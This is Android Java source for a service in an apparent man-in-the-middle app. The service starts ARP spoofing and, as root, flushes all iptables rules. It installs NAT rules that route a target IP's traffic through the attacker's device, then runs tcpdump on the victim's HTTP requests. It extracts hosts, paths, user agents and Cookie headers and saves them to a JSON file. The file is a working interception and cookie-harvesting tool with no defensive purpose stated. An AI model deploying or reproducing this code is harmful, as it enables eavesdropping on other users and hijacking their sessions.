
/**   
 * @Title: ProxyService.java 
 * @Package: com.github.fdxxw.mitmstu.service 
 * @Description: TODO
 * @author fdxxw ucmxxw@163.com 
 * @date 2017年4月11日 下午3:15:17 
 */


package com.github.fdxxw.mitmstu.service;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.content.Intent;
import android.util.Log;

import com.alibaba.fastjson.JSON;
import com.github.fdxxw.mitmstu.common.AppContext;
import com.github.fdxxw.mitmstu.common.HttpPacket;
import com.github.fdxxw.mitmstu.utils.FileUtils;
import com.github.fdxxw.mitmstu.utils.ShellUtils;

/** 
 * 代理服务，路由转发
 * @author fdxxw ucmxxw@163.com
 * @date 2017年4月11日 下午3:15:17 
 */

public class ProxyService extends BaseService {
    
    
    
    /** 开启ip转发 */
      	
    public static String[] START_IP_FORWARD = {
            "iptables -t nat -F",
            "iptables -F",
            "iptables -X",
            "iptables -P FORWARD ACCEPT"}; 
    
    
    /** 
     * 添加源地址是被攻击主机的地址时，修改为攻击者的地址（外出数据）的转发规则
     */ 	
    public static String ALTER_SOURCE_ADDRESS_CMD = 
            "iptables -t nat -A POSTROUTING -s targetIp -j SNAT --to-source attackerIp"; 
    
    
    /** 删除对应的规则*/
      	
    public static String UN_ALTER_SOURCE_ADDRESS_CMD ;
    
    
    /**  
     * 添加目的地址是攻击者主机的地址时，修改为被攻击者的地址（流入数据）的转发规则。
     */
      	
    public static String ALTER_TARGET_ADDRESS_CMD = 
            "iptables -t nat -A PREROUTING -d attackerIp -j DNAT --to targetIp";
    
    
    /** 删除对应的规则 */
      	
    public static String UN_ALTER_TARGET_ADDRESS_CMD;
    
    public static String[] HIJACK_CMD = new String[2];
    
    public static String[] UN_HIJACK_CMD = new String[2];
    
    private Intent intent = null;
    
    private Thread hijack = null;
    
    /** 劫持数据命令*/
    
    private String hijack_cmd = null;
    
    
    /** 保存数据劫持的文件名*/
        
    public static String hijack_file_name = null;
    
    public Map<String,HttpPacket> dataMap = new HashMap<String,HttpPacket>();
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        this.intent = intent;
        String targetIp = intent.getStringExtra("targetIp");
        String attackerIp = intent.getStringExtra("attackerIp");
        ALTER_SOURCE_ADDRESS_CMD = ALTER_SOURCE_ADDRESS_CMD.replace("targetIp", targetIp).replace("attackerIp", attackerIp);
        ALTER_TARGET_ADDRESS_CMD = ALTER_TARGET_ADDRESS_CMD.replace("targetIp", targetIp).replace("attackerIp", attackerIp);
        
        UN_ALTER_SOURCE_ADDRESS_CMD = ALTER_SOURCE_ADDRESS_CMD.replace("-A", "-D");
        UN_ALTER_TARGET_ADDRESS_CMD = ALTER_TARGET_ADDRESS_CMD.replace("-A", "-D");
        HIJACK_CMD[0] = ALTER_SOURCE_ADDRESS_CMD;
        HIJACK_CMD[1] = ALTER_TARGET_ADDRESS_CMD;
        UN_HIJACK_CMD[0] = UN_ALTER_SOURCE_ADDRESS_CMD;
        UN_HIJACK_CMD[1] = UN_ALTER_TARGET_ADDRESS_CMD;
        
        SimpleDateFormat df = new SimpleDateFormat("ddHHmm");
        String date = df.format(new Date());
        
        hijack_file_name = "hijack_" + date + ".json";
        
        //hijack_cmd = "tcpdump -w " + AppContext.getmStoragePath() + "/" + hijack_file_name + "" 
       //         + "-l -A -s 0 -n 'host " + AppContext.getTarget().getIp() + "and tcp port 80 and (tcp[20:2]=0x4745 or top[20:2]=0x4854)'";
        hijack_cmd = "tcpdump " 
        		+ " -A -s 0 -n 'host " + AppContext.getTarget().getIp() + " and tcp and (tcp[20:2]=0x4745 or tcp[20:2]=0x4854)'";
        
        startHiJack();
        return super.onStartCommand(intent, flags, startId);
    }
    
     
    /** 
     * 启动数据劫持
     * @author fdxxw ucmxxw@163.com  
     */
      	
    private void startHiJack() {
        startArpService();
        hijack = new Thread() {
            public void run() {
                //ShellUtils.execCommand(START_IP_FORWARD, true, false, false);
               // ShellUtils.execCommand(hijack_cmd, true, false, false);
               // ShellUtils.execCommand(HIJACK_CMD, true, false, false);
            	try {
            		
            		ShellUtils.execCommand(START_IP_FORWARD, true, false, true);
            		Process process = Runtime.getRuntime().exec("su");
            		DataOutputStream os = new DataOutputStream(process.getOutputStream());
            		os.write(hijack_cmd.getBytes());
            		os.write("\n".getBytes());
            		/*BufferedReader err = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            		String line = null;
            		while((line = err.readLine()) != null) {
            			Log.d("tcp", line);
            		}
            		BufferedReader success = new BufferedReader(new InputStreamReader(process.getInputStream()));
            		String s = null;
            		while((s = success.readLine()) != null) {
            			Log.d("tcp", line);
            		}*/
            		new OutputProcessor(process.getErrorStream(),"tcp_err").start();
            		new OutputProcessor(process.getInputStream(),"tcp_suc").start();
            		int i = process.waitFor();
            		Log.d("tcp", i + "");
            		
            	} catch(Exception e) {
            		e.printStackTrace();
            	}
            };
        };
        hijack.start();
        AppContext.isHijackRunning = true;
    }
    
     
    /** 
     * 停止数据劫持服务
     * @author fdxxw ucmxxw@163.com  
     */
      	
    private void stopHiJack() {
    	Log.i("json", JSON.toJSONString(dataMap));
    	FileUtils.storeData(new File(AppContext.getmStoragePath() + "/" + hijack_file_name), JSON.toJSONString(dataMap));
        if(hijack != null) {
            hijack.interrupt();
            hijack = null;
        }
        new Thread() {
            public void run() {
                ShellUtils.execCommand("killall iptables", true, false, true);
                ShellUtils.execCommand("killall tcpdump", true, false, true);
                //ShellUtils.execCommand(UN_HIJACK_CMD, true, false, true);
            };
        }.start();
        AppContext.isHijackRunning = false;
        stopArpService();
    }
    
	
    @Override
    public void onDestroy() {
        stopHiJack();
        super.onDestroy();
    }
    
    /**
     * 执行终端命令的输出处理
     * @author fdxxw
     *
     */
    class OutputProcessor extends Thread{
    	
    	private InputStream inputStream;
    	
    	private String tag;
    	
    	public OutputProcessor(InputStream inputStream,String tag) {
    		this.inputStream = inputStream;
    		this.tag = tag;
		}
    	
    	@Override
    	public void run() {
    		try {
    			String regxCut = "^(\\d{2}:){2}\\d{2}\\.(.*?)";
    			Pattern pattCut = Pattern.compile(regxCut);
    			Matcher matcCut = null;
                InputStreamReader isr = new InputStreamReader(inputStream);
                BufferedReader br = new BufferedReader(isr);
                HttpPacket httpPacket = null;
                String line;
                while ((line = br.readLine()) != null) {
                	matcCut = pattCut.matcher(line);
                	if(matcCut.find()) {
                		if(httpPacket != null && httpPacket.getHost() != null) {
                			dataMap.put(httpPacket.getHost(), httpPacket);
                		}
                		httpPacket = new HttpPacket();
                		httpPacket.setTime(line);
                	}
                	if(httpPacket != null) {
                		processLine(httpPacket, line);
                	}
                	Log.d(tag, line);
                }
            } catch (Exception e) {
            	Log.d(tag, e.getMessage());
            }
    	}
    }
    
    public static HttpPacket processLine(HttpPacket httpPacket,String line) {
    	if(httpPacket == null) {
    		httpPacket = new HttpPacket();
    	}
    	String regxPath = "(.*?)GET(.*?)HTTP/1.1(.*?)";
    	String regxHost = "^(Host:).*?";
    	String regxConnection = "^(Connection:).*?";
    	String regxUserAgent = "^(User-Agent:).*?";
    	String regxAcceptEncoding = "^(Accept-Encoding:).*?";
    	String regxAcceptLanguage = "^(Accept-Language:).*?";
    	String regxAcceptCharset = "^(Accept-Charset:).*?";
    	String regxCookie = "^(Cookie:).*?";
    	
    	Pattern pattPath = Pattern.compile(regxPath);
    	Pattern pattHost = Pattern.compile(regxHost);
    	Pattern pattConnection = Pattern.compile(regxConnection);
    	Pattern pattUserAgent = Pattern.compile(regxUserAgent);
    	Pattern pattAcceptEncoding = Pattern.compile(regxAcceptEncoding);
    	Pattern pattAcceptLanguage = Pattern.compile(regxAcceptLanguage);
    	Pattern pattAcceptCharset = Pattern.compile(regxAcceptCharset);
    	Pattern pattCookie = Pattern.compile(regxCookie);
    	
    	Matcher matcPath = pattPath.matcher(line);
    	Matcher matcHost = pattHost.matcher(line);
    	Matcher matcConnection = pattConnection.matcher(line);
    	Matcher matcUserAgent = pattUserAgent.matcher(line);
    	Matcher matcAcceptEncoding = pattAcceptEncoding.matcher(line);
    	Matcher matcAcceptLanguage = pattAcceptLanguage.matcher(line);
    	Matcher matcAcceptCharset = pattAcceptCharset.matcher(line);
    	Matcher matcCookie = pattCookie.matcher(line);
    	if(matcPath.find()) {
    		httpPacket.setPath(matcPath.group(2).trim());
    	} else if(matcHost.find()) {
    		httpPacket.setHost(line);
    	} else if(matcConnection.find()) {
    		httpPacket.setConnection(line);
    	} else if(matcUserAgent.find()) {
    		httpPacket.setUser_agent(line);
    	} else if(matcAcceptEncoding.find()) {
    		httpPacket.setAccept_encoding(line);
    	} else if(matcAcceptLanguage.find()) {
    		httpPacket.setAccept_language(line);
    	} else if(matcAcceptCharset.find()) {
    		httpPacket.setAccept_charset(line);
    	} else if(matcCookie.find()) {
    		httpPacket.setCookie(line);
    	}
    	
    	Log.i("json", JSON.toJSONString(httpPacket));
    	return httpPacket;
    }
    
    public static void putData(Map<String,HttpPacket> dataMap,HttpPacket packet) {
    	HttpPacket pre = null;
    	if((pre = dataMap.get(packet.getHost())) != null) {
    		pre.getPaths().add(packet.getPath());
    	} else {
    		packet.getPaths().add(packet.getPath());
    		dataMap.put(packet.getHost(), packet);
    	}
    }
    
}
